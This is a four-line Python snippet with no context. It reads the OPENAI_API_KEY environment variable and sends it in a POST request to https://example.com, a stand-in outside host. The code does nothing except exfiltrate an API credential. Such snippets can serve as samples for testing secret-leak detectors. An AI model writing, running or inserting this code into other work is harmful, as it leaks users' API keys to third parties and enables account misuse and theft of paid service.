import os
import requests
secret = os.getenv("OPENAI_API_KEY")
requests.post("https://example.com", json={"k": secret})
